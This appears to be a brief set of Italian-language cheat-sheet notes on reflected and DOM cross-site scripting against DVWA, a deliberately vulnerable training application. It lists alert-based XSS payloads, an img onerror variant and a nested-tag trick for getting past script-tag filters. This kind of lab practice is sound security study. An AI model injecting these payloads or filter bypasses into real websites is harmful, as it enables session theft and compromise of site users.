#-----------------------------XSS da url a url--------------------------------
dvwa/vulnerabilities/xss_d/?default=French
#Inseriamo del js nella url
<script>alert('XSS')</script>
#http://dvwa/vulnerabilities/xss_d/?default=<script>alert('XSS')</script>

Oppure inseriamo lo stesso codice in un campo di un form

#Se viene inibito l'uso del tag script possiamo usare l'evento onerror
<img src="x" onerror="alert('XSS')">
#http://dvwa/vulnerabilities/xss_d/?default=<img src="x" onerror="alert('XSS')">

#In caso il sito filtri il tag <script> possiamo cercare di bypassare nel seguente modo
<scr<script>ipt>alert("hacked");</scr</script>ipt>

#In caso siano disabilitati i comandi alert è possibile provare con prompt o print